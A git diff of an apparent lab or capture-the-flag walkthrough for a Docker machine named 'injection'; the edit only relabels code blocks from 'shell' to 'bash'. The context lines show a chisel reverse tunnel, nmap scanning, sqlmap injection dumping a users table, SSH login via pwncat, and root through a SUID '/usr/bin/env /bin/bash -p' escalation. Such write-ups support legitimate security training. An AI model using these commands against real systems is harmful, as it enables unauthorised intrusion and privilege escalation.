@@ -12,7 +12,7 @@ Fecha de creación: 09/04/2024
 
 ## Deploy
 
-```shell
+```bash
 randark@developer:~$ unzip injection.zip
 Archive:  injection.zip
   inflating: injection.tar
@@ -47,7 +47,7 @@ randark@developer:~$ docker inspect injection | jq ".[0].NetworkSettings.Network
 
 ## Proxy
 
-```shell
+```bash
 # kali
 ┌──(randark ㉿ kali)-[~]
 └─$ ./tools/chisel-v1.9.1/chisel_1.9.1_linux_amd64 server -p 1337 --reverse
@@ -63,7 +63,7 @@ randark@developer:~$ ./tools/chisel-v1.9.1/chisel_1.9.1_linux_amd64 client 192.1
 
 ## Scan
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ proxychains -q nmap --min-rate=2000 -A -p- 172.17.0.2
 Starting Nmap 7.94SVN (https://nmap.org) at 2025-02-04 10:53 CST
@@ -91,7 +91,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 try to use sqlmap
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ proxychains -q sqlmap -u http://172.17.0.2/ --forms
         ___
@@ -200,7 +200,7 @@ back-end DBMS: MySQL >= 5.0 (MariaDB fork)
 
 try to automatic exploit
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ proxychains -q sqlmap -u http://172.17.0.2/ --forms --batch --dbs
 ......
@@ -235,7 +235,7 @@ Table: users
 
 ## Port 22 SSH
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ proxychains -q pwncat-cs dylan@172.17.0.2
 ......
@@ -246,7 +246,7 @@ dylan
 
 try to get privilege
 
-```shell
+```bash
 (remote) dylan@bf3225d3d173:/home/dylan$ find / -perm -4000 -user root 2>/dev/null
 /usr/bin/su
 /usr/bin/chfn
@@ -263,7 +263,7 @@ try to get privilege
 
 we can use `/usr/bin/env` to get root
 
-```shell
+```bash
 (remote) dylan@bf3225d3d173:/home/dylan$ /usr/bin/env /bin/bash -p
 (remote) root@bf3225d3d173:/home/dylan# whoami
 root
